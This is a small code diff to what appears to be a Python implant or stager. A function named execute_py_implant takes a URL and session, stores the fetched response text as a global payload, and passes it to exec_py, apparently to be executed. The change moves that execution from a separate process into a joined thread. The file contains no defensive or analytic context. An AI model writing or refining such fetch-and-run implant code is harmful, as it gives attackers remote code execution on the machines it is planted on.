@@ -4,6 +4,7 @@ import time
 import os
 from multiprocessing import Process
 import base64
+import threading
 
 def exec_py():
     global payload
@@ -15,8 +16,9 @@ def execute_py_implant(url,session):
         global payload
         payload = response.text
         try:
-            a = Process(target=exec_py)
-            a.start()
+            th = threading.Thread(target=exec_py)
+            th.start()
+            th.join()
         except:
             pass
 
